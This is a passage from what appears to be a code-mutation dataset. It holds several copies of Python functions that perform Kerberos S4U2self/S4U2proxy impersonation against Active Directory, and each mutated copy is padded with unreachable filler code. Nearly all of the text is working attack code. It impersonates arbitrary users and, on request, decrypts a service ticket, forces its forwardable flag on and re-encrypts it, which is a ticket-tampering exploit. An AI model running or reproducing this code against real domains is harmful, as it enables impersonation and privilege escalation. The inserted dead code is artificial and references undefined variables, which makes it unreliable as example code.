= random.getrandbits(31)\n    seq_set_iter(reqBody, 'etype', (int(cipher.enctype), int(constants.EncryptionTypes.rc4_hmac.value)))\n    if logging.getLogger().level == logging.DEBUG:\n        logging.debug('Final TGS')\n        print(tgsReq.prettyPrint())\n    logging.info('\\tRequesting S4U2self')\n    message = encoder.encode(tgsReq)\n    r = sendReceive(message, self.__domain, kdcHost)\n    tgs = decoder.decode(r, asn1Spec=TGS_REP())[0]\n    if logging.getLogger().level == logging.DEBUG:\n        logging.debug('TGS_REP')\n        print(tgs.prettyPrint())\n    if self.__force_forwardable:\n        if isinstance(nthash, str):\n            try:\n                nthash = unhexlify(nthash)\n            except TypeError:\n                pass\n        if isinstance(aesKey, str):\n            try:\n                aesKey = unhexlify(aesKey)\n            except TypeError:\n                pass\n        if self.__password != '' and self.__domain != '' and (self.__user != ''):\n            if not nthash:\n                nthash = compute_nthash(self.__password)\n                if logging.getLogger().level == logging.DEBUG:\n                    logging.debug('NTHash')\n                    print(hexlify(nthash).decode())\n            if not aesKey:\n                salt = self.__domain.upper() + self.__user\n                aesKey = _AES256CTS.string_to_key(self.__password, salt, params=None).contents\n                if logging.getLogger().level == logging.DEBUG:\n                    logging.debug('AESKey')\n                    print(hexlify(aesKey).decode())\n        cipherText = tgs['ticket']['enc-part']['cipher']\n        newCipher = _enctype_table[int(tgs['ticket']['enc-part']['etype'])]\n        if newCipher.enctype == Enctype.RC4:\n            key = Key(newCipher.enctype, nthash)\n        else:\n            key = Key(newCipher.enctype, aesKey)\n        plainText = newCipher.decrypt(key, 2, cipherText)\n        encTicketPart = decoder.decode(plainText, asn1Spec=EncTicketPart())[0]\n        logging.debug('\\tService ticket from S4U2self flags: ' + str(encTicketPart['flags']))\n        logging.debug('\\tService ticket from S4U2self is' + ('' if encTicketPart['flags'][TicketFlags.forwardable.value] == 1 else ' not') + ' forwardable')\n        logging.info('\\tForcing the service ticket to be forwardable')\n        flagBits = encTicketPart['flags'].asBinary()\n        flagBits = flagBits[:TicketFlags.forwardable.value] + '1' + flagBits[TicketFlags.forwardable.value + 1:]\n        encTicketPart['flags'] = encTicketPart['flags'].clone(value=flagBits)\n        logging.debug('\\tService ticket flags after modification: ' + str(encTicketPart['flags']))\n        logging.debug('\\tService ticket now is' + ('' if encTicketPart['flags'][TicketFlags.forwardable.value] == 1 else ' not') + ' forwardable')\n        encodedEncTicketPart = encoder.encode(encTicketPart)\n        cipherText = newCipher.encrypt(key, 2, encodedEncTicketPart, None)\n        tgs['ticket']['enc-part']['cipher'] = cipherText\n    ticketTGT = Ticket()\n    ticketTGT.from_asn1(decodedTGT['ticket'])\n    ticket = Ticket()\n    ticket.from_asn1(tgs['ticket'])\n    apReq = AP_REQ()\n    apReq['pvno'] = 5\n    apReq['msg-type'] = int(constants.ApplicationTagNumbers.AP_REQ.value)\n    opts = list()\n    apReq['ap-options'] = constants.encodeFlags(opts)\n    seq_set(apReq, 'ticket', ticketTGT.to_asn1)\n    authenticator = Authenticator()\n    authenticator['authenticator-vno'] = 5\n    authenticator['crealm'] = str(decodedTGT['crealm'])\n    clientName = Principal()\n    clientName.from_asn1(decodedTGT, 'crealm', 'cname')\n    seq_set(authenticator, 'cname', clientName.components_to_asn1)\n    now = datetime.datetime.utcnow()\n    authenticator['cusec'] = now.microsecond\n    authenticator['ctime'] = KerberosTime.to_asn1(now)\n    encodedAuthenticator = encoder.encode(authenticator)\n    encryptedEncodedAuthenticator = cipher.encrypt(sessionKey, 7, encodedAuthenticator, None)\n    apReq['authenticator'] = noValue\n    apReq['authenticator']['etype'] = cipher.enctype\n    apReq['authenticator']['cipher'] = encryptedEncodedAuthenticator\n    encodedApReq = encoder.encode(apReq)\n    tgsReq = TGS_REQ()\n    tgsReq['pvno'] = 5\n    tgsReq['msg-type'] = int(constants.ApplicationTagNumbers.TGS_REQ.value)\n    tgsReq['padata'] = noValue\n    tgsReq['padata'][0] = noValue\n    tgsReq['padata'][0]['padata-type'] = int(constants.PreAuthenticationDataTypes.PA_TGS_REQ.value)\n    tgsReq['padata'][0]['padata-value'] = encodedApReq\n    paPacOptions = PA_PAC_OPTIONS()\n    paPacOptions['flags'] = constants.encodeFlags((constants.PAPacOptions.resource_based_constrained_delegation.value,))\n    tgsReq['padata'][1] = noValue\n    tgsReq['padata'][1]['padata-type'] = constants.PreAuthenticationDataTypes.PA_PAC_OPTIONS.value\n    tgsReq['padata'][1]['padata-value'] = encoder.encode(paPacOptions)\n    reqBody = seq_set(tgsReq, 'req-body')\n    opts = list()\n    opts.append(constants.KDCOptions.cname_in_addl_tkt.value)\n    opts.append(constants.KDCOptions.canonicalize.value)\n    opts.append(constants.KDCOptions.forwardable.value)\n    opts.append(constants.KDCOptions.renewable.value)\n    reqBody['kdc-options'] = constants.encodeFlags(opts)\n    service2 = Principal(self.__options.spn, type=constants.PrincipalNameType.NT_SRV_INST.value)\n    seq_set(reqBody, 'sname', service2.components_to_asn1)\n    reqBody['realm'] = self.__domain\n    myTicket = ticket.to_asn1(TicketAsn1())\n    seq_set_iter(reqBody, 'additional-tickets', (myTicket,))\n    now = datetime.datetime.utcnow() + datetime.timedelta(days=1)\n    reqBody['till'] = KerberosTime.to_asn1(now)\n    reqBody['nonce'] = random.getrandbits(31)\n    seq_set_iter(reqBody, 'etype', (int(constants.EncryptionTypes.rc4_hmac.value), int(constants.EncryptionTypes.des3_cbc_sha1_kd.value), int(constants.EncryptionTypes.des_cbc_md5.value), int(cipher.enctype)))\n    message = encoder.encode(tgsReq)\n    logging.info('\\tRequesting S4U2Proxy')\n    r = sendReceive(message, self.__domain, kdcHost)\n    tgs = decoder.decode(r, asn1Spec=TGS_REP())[0]\n    cipherText = tgs['enc-part']['cipher']\n    plainText = cipher.decrypt(sessionKey, 8, cipherText)\n    encTGSRepPart = decoder.decode(plainText, asn1Spec=EncTGSRepPart())[0]\n    newSessionKey = Key(encTGSRepPart['key']['keytype'], encTGSRepPart['key']['keyvalue'])\n    cipher = _enctype_table[encTGSRepPart['key']['keytype']]\n    return (r, cipher, sessionKey, newSessionKey)",
            "def doS4U(self, tgt, cipher, oldSessionKey, sessionKey, nthash, aesKey, kdcHost):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n        length = 15\n        if length <= 0:\n            return []\n        elif length == 1:\n            return [0]\n        sequence = [0, 1]\n        while len(sequence) < length:\n            next_value = sequence[-1] + sequence[-2]\n            sequence.append(next_value)\n        return sequence\n    decodedTGT = decoder.decode(tgt, asn1Spec=AS_REP())[0]\n    ticket = Ticket()\n    ticket.from_asn1(decodedTGT['ticket'])\n    apReq = AP_REQ()\n    apReq['pvno'] = 5\n    apReq['msg-type'] = int(constants.ApplicationTagNumbers.AP_REQ.value)\n    opts = list()\n    apReq['ap-options'] = constants.encodeFlags(opts)\n    seq_set(apReq, 'ticket', ticket.to_asn1)\n    authenticator = Authenticator()\n    authenticator['authenticator-vno'] = 5\n    authenticator['crealm'] = str(decodedTGT['crealm'])\n    clientName = Principal()\n    clientName.from_asn1(decodedTGT, 'crealm', 'cname')\n    seq_set(authenticator, 'cname', clientName.components_to_asn1)\n    now = datetime.datetime.utcnow()\n    authenticator['cusec'] = now.microsecond\n    authenticator['ctime'] = KerberosTime.to_asn1(now)\n    if logging.getLogger().level == logging.DEBUG:\n        logging.debug('AUTHENTICATOR')\n        print(authenticator.prettyPrint())\n        print('\\n')\n    encodedAuthenticator = encoder.encode(authenticator)\n    encryptedEncodedAuthenticator = cipher.encrypt(sessionKey, 7, encodedAuthenticator, None)\n    apReq['authenticator'] = noValue\n    apReq['authenticator']['etype'] = cipher.enctype\n    apReq['authenticator']['cipher'] = encryptedEncodedAuthenticator\n    encodedApReq = encoder.encode(apReq)\n    tgsReq = TGS_REQ()\n    tgsReq['pvno'] = 5\n    tgsReq['msg-type'] = int(constants.ApplicationTagNumbers.TGS_REQ.value)\n    tgsReq['padata'] = noValue\n    tgsReq['padata'][0] = noValue\n    tgsReq['padata'][0]['padata-type'] = int(constants.PreAuthenticationDataTypes.PA_TGS_REQ.value)\n    tgsReq['padata'][0]['padata-value'] = encodedApReq\n    clientName = Principal(self.__options.impersonate, type=constants.PrincipalNameType.NT_PRINCIPAL.value)\n    S4UByteArray = struct.pack('<I', constants.PrincipalNameType.NT_PRINCIPAL.value)\n    S4UByteArray += b(self.__options.impersonate) + b(self.__domain) + b'Kerberos'\n    if logging.getLogger().level == logging.DEBUG:\n        logging.debug('S4UByteArray')\n        hexdump(S4UByteArray)\n    checkSum = _HMACMD5.checksum(sessionKey, 17, S4UByteArray)\n    if logging.getLogger().level == logging.DEBUG:\n        logging.debug('CheckSum')\n        hexdump(checkSum)\n    paForUserEnc = PA_FOR_USER_ENC()\n    seq_set(paForUserEnc, 'userName', clientName.components_to_asn1)\n    paForUserEnc['userRealm'] = self.__domain\n    paForUserEnc['cksum'] = noValue\n    paForUserEnc['cksum']['cksumtype'] = int(constants.ChecksumTypes.hmac_md5.value)\n    paForUserEnc['cksum']['checksum'] = checkSum\n    paForUserEnc['auth-package'] = 'Kerberos'\n    if logging.getLogger().level == logging.DEBUG:\n        logging.debug('PA_FOR_USER_ENC')\n        print(paForUserEnc.prettyPrint())\n    encodedPaForUserEnc = encoder.encode(paForUserEnc)\n    tgsReq['padata'][1] = noValue\n    tgsReq['padata'][1]['padata-type'] = int(constants.PreAuthenticationDataTypes.PA_FOR_USER.value)\n    tgsReq['padata'][1]['padata-value'] = encodedPaForUserEnc\n    reqBody = seq_set(tgsReq, 'req-body')\n    opts = list()\n    opts.append(constants.KDCOptions.forwardable.value)\n    opts.append(constants.KDCOptions.renewable.value)\n    opts.append(constants.KDCOptions.canonicalize.value)\n    reqBody['kdc-options'] = constants.encodeFlags(opts)\n    serverName = Principal(self.__user, type=constants.PrincipalNameType.NT_UNKNOWN.value)\n    seq_set(reqBody, 'sname', serverName.components_to_asn1)\n    reqBody['realm'] = str(decodedTGT['crealm'])\n    now = datetime.datetime.utcnow() + datetime.timedelta(days=1)\n    reqBody['till'] = KerberosTime.to_asn1(now)\n    reqBody['nonce'] = random.getrandbits(31)\n    seq_set_iter(reqBody, 'etype', (int(cipher.enctype), int(constants.EncryptionTypes.rc4_hmac.value)))\n    if logging.getLogger().level == logging.DEBUG:\n        logging.debug('Final TGS')\n        print(tgsReq.prettyPrint())\n    logging.info('\\tRequesting S4U2self')\n    message = encoder.encode(tgsReq)\n    r = sendReceive(message, self.__domain, kdcHost)\n    tgs = decoder.decode(r, asn1Spec=TGS_REP())[0]\n    if logging.getLogger().level == logging.DEBUG:\n        logging.debug('TGS_REP')\n        print(tgs.prettyPrint())\n    if self.__force_forwardable:\n        if isinstance(nthash, str):\n            try:\n                nthash = unhexlify(nthash)\n            except TypeError:\n                pass\n        if isinstance(aesKey, str):\n            try:\n                aesKey = unhexlify(aesKey)\n            except TypeError:\n                pass\n        if self.__password != '' and self.__domain != '' and (self.__user != ''):\n            if not nthash:\n                nthash = compute_nthash(self.__password)\n                if logging.getLogger().level == logging.DEBUG:\n                    logging.debug('NTHash')\n                    print(hexlify(nthash).decode())\n            if not aesKey:\n                salt = self.__domain.upper() + self.__user\n                aesKey = _AES256CTS.string_to_key(self.__password, salt, params=None).contents\n                if logging.getLogger().level == logging.DEBUG:\n                    logging.debug('AESKey')\n                    print(hexlify(aesKey).decode())\n        cipherText = tgs['ticket']['enc-part']['cipher']\n        newCipher = _enctype_table[int(tgs['ticket']['enc-part']['etype'])]\n        if newCipher.enctype == Enctype.RC4:\n            key = Key(newCipher.enctype, nthash)\n        else:\n            key = Key(newCipher.enctype, aesKey)\n        plainText = newCipher.decrypt(key, 2, cipherText)\n        encTicketPart = decoder.decode(plainText, asn1Spec=EncTicketPart())[0]\n        logging.debug('\\tService ticket from S4U2self flags: ' + str(encTicketPart['flags']))\n        logging.debug('\\tService ticket from S4U2self is' + ('' if encTicketPart['flags'][TicketFlags.forwardable.value] == 1 else ' not') + ' forwardable')\n        logging.info('\\tForcing the service ticket to be forwardable')\n        flagBits = encTicketPart['flags'].asBinary()\n        flagBits = flagBits[:TicketFlags.forwardable.value] + '1' + flagBits[TicketFlags.forwardable.value + 1:]\n        encTicketPart['flags'] = encTicketPart['flags'].clone(value=flagBits)\n        logging.debug('\\tService ticket flags after modification: ' + str(encTicketPart['flags']))\n        logging.debug('\\tService ticket now is' + ('' if encTicketPart['flags'][TicketFlags.forwardable.value] == 1 else ' not') + ' forwardable')\n        encodedEncTicketPart = encoder.encode(encTicketPart)\n        cipherText = newCipher.encrypt(key, 2, encodedEncTicketPart, None)\n        tgs['ticket']['enc-part']['cipher'] = cipherText\n    ticketTGT = Ticket()\n    ticketTGT.from_asn1(decodedTGT['ticket'])\n    ticket = Ticket()\n    ticket.from_asn1(tgs['ticket'])\n    apReq = AP_REQ()\n    apReq['pvno'] = 5\n    apReq['msg-type'] = int(constants.ApplicationTagNumbers.AP_REQ.value)\n    opts = list()\n    apReq['ap-options'] = constants.encodeFlags(opts)\n    seq_set(apReq, 'ticket', ticketTGT.to_asn1)\n    authenticator = Authenticator()\n    authenticator['authenticator-vno'] = 5\n    authenticator['crealm'] = str(decodedTGT['crealm'])\n    clientName = Principal()\n    clientName.from_asn1(decodedTGT, 'crealm', 'cname')\n    seq_set(authenticator, 'cname', clientName.components_to_asn1)\n    now = datetime.datetime.utcnow()\n    authenticator['cusec'] = now.microsecond\n    authenticator['ctime'] = KerberosTime.to_asn1(now)\n    encodedAuthenticator = encoder.encode(authenticator)\n    encryptedEncodedAuthenticator = cipher.encrypt(sessionKey, 7, encodedAuthenticator, None)\n    apReq['authenticator'] = noValue\n    apReq['authenticator']['etype'] = cipher.enctype\n    apReq['authenticator']['cipher'] = encryptedEncodedAuthenticator\n    encodedApReq = encoder.encode(apReq)\n    tgsReq = TGS_REQ()\n    tgsReq['pvno'] = 5\n    tgsReq['msg-type'] = int(constants.ApplicationTagNumbers.TGS_REQ.value)\n    tgsReq['padata'] = noValue\n    tgsReq['padata'][0] = noValue\n    tgsReq['padata'][0]['padata-type'] = int(constants.PreAuthenticationDataTypes.PA_TGS_REQ.value)\n    tgsReq['padata'][0]['padata-value'] = encodedApReq\n    paPacOptions = PA_PAC_OPTIONS()\n    paPacOptions['flags'] = constants.encodeFlags((constants.PAPacOptions.resource_based_constrained_delegation.value,))\n    tgsReq['padata'][1] = noValue\n    tgsReq['padata'][1]['padata-type'] = constants.PreAuthenticationDataTypes.PA_PAC_OPTIONS.value\n    tgsReq['padata'][1]['padata-value'] = encoder.encode(paPacOptions)\n    reqBody = seq_set(tgsReq, 'req-body')\n    opts = list()\n    opts.append(constants.KDCOptions.cname_in_addl_tkt.value)\n    opts.append(constants.KDCOptions.canonicalize.value)\n    opts.append(constants.KDCOptions.forwardable.value)\n    opts.append(constants.KDCOptions.renewable.value)\n    reqBody['kdc-options'] = constants.encodeFlags(opts)\n    service2 = Principal(self.__options.spn, type=constants.PrincipalNameType.NT_SRV_INST.value)\n    seq_set(reqBody, 'sname', service2.components_to_asn1)\n    reqBody['realm'] = self.__domain\n    myTicket = ticket.to_asn1(TicketAsn1())\n    seq_set_iter(reqBody, 'additional-tickets', (myTicket,))\n    now = datetime.datetime.utcnow() + datetime.timedelta(days=1)\n    reqBody['till'] = KerberosTime.to_asn1(now)\n    reqBody['nonce'] = random.getrandbits(31)\n    seq_set_iter(reqBody, 'etype', (int(constants.EncryptionTypes.rc4_hmac.value), int(constants.EncryptionTypes.des3_cbc_sha1_kd.value), int(constants.EncryptionTypes.des_cbc_md5.value), int(cipher.enctype)))\n    message = encoder.encode(tgsReq)\n    logging.info('\\tRequesting S4U2Proxy')\n    r = sendReceive(message, self.__domain, kdcHost)\n    tgs = decoder.decode(r, asn1Spec=TGS_REP())[0]\n    cipherText = tgs['enc-part']['cipher']\n    plainText = cipher.decrypt(sessionKey, 8, cipherText)\n    encTGSRepPart = decoder.decode(plainText, asn1Spec=EncTGSRepPart())[0]\n    newSessionKey = Key(encTGSRepPart['key']['keytype'], encTGSRepPart['key']['keyvalue'])\n    cipher = _enctype_table[encTGSRepPart['key']['keytype']]\n    return (r, cipher, sessionKey, newSessionKey)"
        ]
    },
    {
        "func_name": "run",
        "original": "def run(self):\n    tgt = None\n    (domain, _, TGT, _) = CCache.parseFile(self.__domain)\n    if TGT is not None:\n        (tgt, cipher, sessionKey) = (TGT['KDC_REP'], TGT['cipher'], TGT['sessionKey'])\n        oldSessionKey = sessionKey\n    if tgt is None:\n        userName = Principal(self.__user, type=constants.PrincipalNameType.NT_PRINCIPAL.value)\n        logging.info('Getting TGT for user')\n        (tgt, cipher, oldSessionKey, sessionKey) = getKerberosTGT(userName, self.__password, self.__domain, unhexlify(self.__lmhash), unhexlify(self.__nthash), self.__aesKey, self.__kdcHost)\n    if self.__options.impersonate is None:\n        logging.info('Getting ST for user')\n        serverName = Principal(self.__options.spn, type=constants.PrincipalNameType.NT_SRV_INST.value)\n        (tgs, cipher, oldSessionKey, sessionKey) = getKerberosTGS(serverName, domain, self.__kdcHost, tgt, cipher, sessionKey)\n        self.__saveFileName = self.__user\n    else:\n        try:\n            logging.info('Impersonating %s' % self.__options.impersonate)\n            if self.__additional_ticket is not None:\n                (tgs, cipher, oldSessionKey, sessionKey) = self.doS4U2ProxyWithAdditionalTicket(tgt, cipher, oldSessionKey, sessionKey, unhexlify(self.__nthash), self.__aesKey, self.__kdcHost, self.__additional_ticket)\n            else:\n                (tgs, cipher, oldSessionKey, sessionKey) = self.doS4U(tgt, cipher, oldSessionKey, sessionKey, unhexlify(self.__nthash), self.__aesKey, self.__kdcHost)\n        except Exception as e:\n            logging.debug('Exception', exc_info=True)\n            logging.error(str(e))\n            if str(e).find('KDC_ERR_S_PRINCIPAL_UNKNOWN') >= 0:\n                logging.error('Probably user %s does not have constrained delegation permisions or impersonated user does not exist' % self.__user)\n            if str(e).find('KDC_ERR_BADOPTION') >= 0:\n                logging.error('Probably SPN is not allowed to delegate by user %s or initial TGT not forwardable' % self.__user)\n            return\n        self.__saveFileName = self.__options.impersonate\n    self.saveTicket(tgs, oldSessionKey)",
        "mutated": [
            "def run(self):\n    if False:\n        i = 10\n    tgt = None\n    (domain, _, TGT, _) = CCache.parseFile(self.__domain)\n    if TGT is not None:\n        (tgt, cipher, sessionKey) = (TGT['KDC_REP'], TGT['cipher'], TGT['sessionKey'])\n        oldSessionKey = sessionKey\n    if tgt is None:\n        userName = Principal(self.__user, type=constants.PrincipalNameType.NT_PRINCIPAL.value)\n        logging.info('Getting TGT for user')\n        (tgt, cipher, oldSessionKey, sessionKey) = getKerberosTGT(userName, self.__password, self.__domain, unhexlify(self.__lmhash), unhexlify(self.__nthash), self.__aesKey, self.__kdcHost)\n    if self.__options.impersonate is None:\n        logging.info('Getting ST for user')\n        serverName = Principal(self.__options.spn, type=constants.PrincipalNameType.NT_SRV_INST.value)\n        (tgs, cipher, oldSessionKey, sessionKey) = getKerberosTGS(serverName, domain, self.__kdcHost, tgt, cipher, sessionKey)\n        self.__saveFileName = self.__user\n    else:\n        try:\n            logging.info('Impersonating %s' % self.__options.impersonate)\n            if self.__additional_ticket is not None:\n                (tgs, cipher, oldSessionKey, sessionKey) = self.doS4U2ProxyWithAdditionalTicket(tgt, cipher, oldSessionKey, sessionKey, unhexlify(self.__nthash), self.__aesKey, self.__kdcHost, self.__additional_ticket)\n            else:\n                (tgs, cipher, oldSessionKey, sessionKey) = self.doS4U(tgt, cipher, oldSessionKey, sessionKey, unhexlify(self.__nthash), self.__aesKey, self.__kdcHost)\n        except Exception as e:\n            logging.debug('Exception', exc_info=True)\n            logging.error(str(e))\n            if str(e).find('KDC_ERR_S_PRINCIPAL_UNKNOWN') >= 0:\n                logging.error('Probably user %s does not have constrained delegation permisions or impersonated user does not exist' % self.__user)\n            if str(e).find('KDC_ERR_BADOPTION') >= 0:\n                logging.error('Probably SPN is not allowed to delegate by user %s or initial TGT not forwardable' % self.__user)\n            return\n        self.__saveFileName = self.__options.impersonate\n    self.saveTicket(tgs, oldSessionKey)",
            "def run(self):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n    tgt = None\n    (domain, _, TGT, _) = CCache.parseFile(self.__domain)\n    if TGT is not None:\n        (tgt, cipher, sessionKey) = (TGT['KDC_REP'], TGT['cipher'], TGT['sessionKey'])\n        oldSessionKey = sessionKey\n    if tgt is None:\n        userName = Principal(self.__user, type=constants.PrincipalNameType.NT_PRINCIPAL.value)\n        logging.info('Getting TGT for user')\n        (tgt, cipher, oldSessionKey, sessionKey) = getKerberosTGT(userName, self.__password, self.__domain, unhexlify(self.__lmhash), unhexlify(self.__nthash), self.__aesKey, self.__kdcHost)\n    if self.__options.impersonate is None:\n        logging.info('Getting ST for user')\n        serverName = Principal(self.__options.spn, type=constants.PrincipalNameType.NT_SRV_INST.value)\n        (tgs, cipher, oldSessionKey, sessionKey) = getKerberosTGS(serverName, domain, self.__kdcHost, tgt, cipher, sessionKey)\n        self.__saveFileName = self.__user\n    else:\n        try:\n            logging.info('Impersonating %s' % self.__options.impersonate)\n            if self.__additional_ticket is not None:\n                (tgs, cipher, oldSessionKey, sessionKey) = self.doS4U2ProxyWithAdditionalTicket(tgt, cipher, oldSessionKey, sessionKey, unhexlify(self.__nthash), self.__aesKey, self.__kdcHost, self.__additional_ticket)\n            else:\n                (tgs, cipher, oldSessionKey, sessionKey) = self.doS4U(tgt, cipher, oldSessionKey, sessionKey, unhexlify(self.__nthash), self.__aesKey, self.__kdcHost)\n        except Exception as e:\n            logging.debug('Exception', exc_info=True)\n            logging.error(str(e))\n            if str(e).find('KDC_ERR_S_PRINCIPAL_UNKNOWN') >= 0:\n                logging.error('Probably user %s does not have constrained delegation permisions or impersonated user does not exist' % self.__user)\n            if str(e).find('KDC_ERR_BADOPTION') >= 0:\n                logging.error('Probably SPN is not allowed to delegate by user %s or initial TGT not forwardable' % self.__user)\n            return\n        self.__saveFileName = self.__options.impersonate\n    self.saveTicket(tgs, oldSessionKey)",
            "def run(self):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n    tgt = None\n    (domain, _, TGT, _) = CCache.parseFile(self.__domain)\n    if TGT is not None:\n        (tgt, cipher, sessionKey) = (TGT['KDC_REP'], TGT['cipher'], TGT['sessionKey'])\n        oldSessionKey = sessionKey\n    if tgt is None:\n        userName = Principal(self.__user, type=constants.PrincipalNameType.NT_PRINCIPAL.value)\n        logging.info('Getting TGT for user')\n        (tgt, cipher, oldSessionKey, sessionKey) = getKerberosTGT(userName, self.__password, self.__domain, unhexlify(self.__lmhash), unhexlify(self.__nthash), self.__aesKey, self.__kdcHost)\n    if self.__options.impersonate is None:\n        logging.info('Getting ST for user')\n        serverName = Principal(self.__options.spn, type=constants.PrincipalNameType.NT_SRV_INST.value)\n        (tgs, cipher, oldSessionKey, sessionKey) = getKerberosTGS(serverName, domain, self.__kdcHost, tgt, cipher, sessionKey)\n        self.__saveFileName = self.__user\n    else:\n        try:\n            logging.info('Impersonating %s' % self.__options.impersonate)\n            if self.__additional_ticket is not None:\n                (tgs, cipher, oldSessionKey, sessionKey) = self.doS4U2ProxyWithAdditionalTicket(tgt, cipher, oldSessionKey, sessionKey, unhexlify(self.__nthash), self.__aesKey, self.__kdcHost, self.__additional_ticket)\n            else:\n                (tgs, cipher, oldSessionKey, sessionKey) = self.doS4U(tgt, cipher, oldSessionKey, sessionKey, unhexlify(self.__nthash), self.__aesKey, self.__kdcHost)\n        except Exception as e:\n            logging.debug('Exception', exc_info=True)\n            logging.error(str(e))\n            if str(e).find('KDC_ERR_S_PRINCIPAL_UNKNOWN') >= 0:\n                logging.error('Probably user %s does not have constrained delegation permisions or impersonated user does not exist' % self.__user)\n            if str(e).find('KDC_ERR_BADOPTION') >= 0:\n                logging.error('Probably SPN is not allowed to delegate by user %s or initial TGT not forwardable' % self.__user)\n            return\n        self.__saveFileName = self.__options.impersonate\n    self.saveTicket(tgs, oldSessionKey)",
            "def run(self):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n    tgt = None\n    (domain, _, TGT, _) = CCache.parseFile(self.__domain)\n    if TGT is not None:\n        (tgt, cipher, sessionKey) = (TGT['KDC_REP'], TGT['cipher'], TGT['sessionKey'])\n        oldSessionKey = sessionKey\n    if tgt is None:\n        userName = Principal(self.__user, type=constants.PrincipalNameType.NT_PRINCIPAL.value)\n        logging.info('Getting TGT for user')\n        (tgt, cipher, oldSessionKey, sessionKey) = getKerberosTGT(userName, self.__password, self.__domain, unhexlify(self.__lmhash), unhexlify(self.__nthash), self.__aesKey, self.__kdcHost)\n    if self.__options.impersonate is None:\n        logging.info('Getting ST for user')\n        serverName = Principal(self.__options.spn, type=constants.PrincipalNameType.NT_SRV_INST.value)\n        (tgs, cipher, oldSessionKey, sessionKey) = getKerberosTGS(serverName, domain, self.__kdcHost, tgt, cipher, sessionKey)\n        self.__saveFileName = self.__user\n    else:\n        try:\n            logging.info('Impersonating %s' % self.__options.impersonate)\n            if self.__additional_ticket is not None:\n                (tgs, cipher, oldSessionKey, sessionKey) = self.doS4U2ProxyWithAdditionalTicket(tgt, cipher, oldSessionKey, sessionKey, unhexlify(self.__nthash), self.__aesKey, self.__kdcHost, self.__additional_ticket)\n            else:\n                (tgs, cipher, oldSessionKey, sessionKey) = self.doS4U(tgt, cipher, oldSessionKey, sessionKey, unhexlify(self.__nthash), self.__aesKey, self.__kdcHost)\n        except Exception as e:\n            logging.debug('Exception', exc_info=True)\n            logging.error(str(e))\n            if str(e).find('KDC_ERR_S_PRINCIPAL_UNKNOWN') >= 0:\n                logging.error('Probably user %s does not have constrained delegation permisions or impersonated user does not exist' % self.__user)\n            if str(e).find('KDC_ERR_BADOPTION') >= 0:\n                logging.error('Probably SPN is not allowed to delegate by user %s or initial TGT not forwardable' % self.__user)\n            return\n        self.__saveFileName = self.__options.impersonate\n    self.saveTicket(tgs, oldSessionKey)",
            "def run(self):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n        length = 15\n        if length <= 0:\n            return []\n        elif length == 1:\n            return [0]\n        sequence = [0, 1]\n        while len(sequence) < length:\n            next_value = sequence[-1] + sequence[-2]\n            sequence.append(next_value)\n        return sequence\n    tgt = None\n    (domain, _, TGT, _) = CCache.parseFile(self.__domain)\n    if TGT is not None:\n        (tgt, cipher, sessionKey) = (TGT['KDC_REP'], TGT['cipher'], TGT['sessionKey'])\n        oldSessionKey = sessionKey\n    if tgt is None:\n        userName = Principal(self.__user, type=constants.PrincipalNameType.NT_PRINCIPAL.value)\n        logging.info('Getting TGT for user')\n        (tgt, cipher, oldSessionKey, sessionKey) = getKerberosTGT(userName, self.__password, self.__domain, unhexlify(self.__lmhash), unhexlify(self.__nthash), self.__aesKey, self.__kdcHost)\n    if self.__options.impersonate is None:\n        logging.info('Getting ST for user')\n        serverName = Principal(self.__options.spn, type=constants.PrincipalNameType.NT_SRV_INST.value)\n        (tgs, cipher, oldSessionKey, sessionKey) = getKerberosTGS(serverName, domain, self.__kdcHost, tgt, cipher, sessionKey)\n        self.__saveFileName = self.__user\n    else:\n        try:\n            logging.info('Impersonating %s' % self.__options.impersonate)\n            if self.__additional_ticket is not None:\n                (tgs, cipher, oldSessionKey, sessionKey) = self.doS4U2ProxyWithAdditionalTicket(tgt, cipher, oldSessionKey, sessionKey, unhexlify(self.__nthash), self.__aesKey, self.__kdcHost, self.__additional_ticket)\n            else:\n                (tgs, cipher, oldSessionKey, sessionKey) = self.doS4U(tgt, cipher, oldSessionKey, sessionKey, unhexlify(self.__nthash), self.__aesKey, self.__kdcHost)\n        except Exception as e:\n            logging.debug('Exception', exc_info=True)\n            logging.error(str(e))\n            if str(e).find('KDC_ERR_S_PRINCIPAL_UNKNOWN') >= 0:\n                logging.error('Probably user %s does not have constrained delegation permisions or impersonated user does not exist' % self.__user)\n            if str(e).find('KDC_ERR_BADOPTION') >= 0:\n                logging.error('Probably SPN is not allowed to delegate by user %s or initial TGT not forwardable' % self.__user)\n            return\n        self.__saveFileName = self.__options.impersonate\n    self.saveTicket(tgs, oldSessionKey)"
        ]
    }
]